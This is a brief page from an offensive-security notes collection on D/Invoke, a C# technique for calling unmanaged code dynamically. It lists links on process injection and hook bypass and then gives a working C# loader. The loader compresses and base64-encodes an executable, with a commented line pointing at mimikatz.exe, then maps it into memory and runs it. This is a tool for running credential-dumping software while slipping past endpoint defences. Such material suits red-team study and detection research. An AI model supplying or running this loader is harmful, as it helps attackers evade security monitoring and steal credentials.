---
description: Dynamic Invocation. Acts as a replacement for PInvoke to dynamically invoke unmanaged code from memory in C#
---

# D/Invoke

* [https://dinvoke.net/](https://dinvoke.net/)
* [https://thewover.github.io/Dynamic-Invoke/](https://thewover.github.io/Dynamic-Invoke/)
* [https://github.com/TheWover/DInvoke](https://github.com/TheWover/DInvoke)
* [https://web.archive.org/web/20210601171512/https://rastamouse.me/blog/process-injection-dinvoke/](https://web.archive.org/web/20210601171512/https://rastamouse.me/blog/process-injection-dinvoke/)
* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/Dinvoke_CreateRemoteThread.cs](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/Dinvoke_CreateRemoteThread.cs)
* [https://blog.nviso.eu/2020/11/20/dynamic-invocation-in-net-to-bypass-hooks/](https://blog.nviso.eu/2020/11/20/dynamic-invocation-in-net-to-bypass-hooks/)
* [https://offensivedefence.co.uk/posts/dinvoke-syscalls/](https://offensivedefence.co.uk/posts/dinvoke-syscalls/)




## Dynamic P/Invoke

- [https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/](https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/)




## Run PE From Memory

- [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PE_Loader_DInvoke_ManualMap.cs](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PE_Loader_DInvoke_ManualMap.cs)

{% code title="DInvokePE.cs" %}
```csharp
using System;
using System.IO;
using System.IO.Compression;

namespace DInvokePE
{
    public class Program
    {
        static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dStream = new DeflateStream(output, CompressionLevel.Optimal))
                dStream.Write(data, 0, data.Length);

            return output.ToArray();
        }

        static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dStream = new DeflateStream(input, CompressionMode.Decompress))
                dStream.CopyTo(output);

            return output.ToArray();
        }

        public static void Main(string[] args)
        {
            /*
            var rawBytes = File.ReadAllBytes(@"C:\Users\snovvcrash\Desktop\mimikatz.exe");
            var compressed = Compress(rawBytes);
            var compressedB64 = Convert.ToBase64String(compressed);
            */

            var compressed = Convert.FromBase64String("");
            var rawBytes = Decompress(compressed);
            DInvoke.Data.PE.PE_MANUAL_MAP map = DInvoke.ManualMap.Map.MapModuleToMemory(rawBytes);
            DInvoke.DynamicInvoke.Generic.CallMappedPEModule(map.PEINFO, map.ModuleBase);
            Console.ReadLine();
        }
    }
}
```
{% endcode %}
